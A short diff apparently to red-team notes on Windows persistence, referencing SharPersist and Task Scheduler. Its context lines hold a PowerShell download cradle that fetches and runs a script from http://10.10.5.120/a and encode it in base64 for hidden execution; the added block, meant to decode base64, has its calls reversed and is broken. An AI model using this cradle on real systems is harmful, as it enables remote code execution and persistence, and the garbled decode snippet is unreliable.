@@ -6,6 +6,11 @@ https://github.com/mandiant/SharPersist
 $str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))'
 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
 ```
+```powershell
+$Encoded=""
+[System.Convert]::FromBase64String([System.Text.Encoding]::Unicode.GetString($Encoded))
+
+```
 
 ### Task Scheduler
 ```powershell
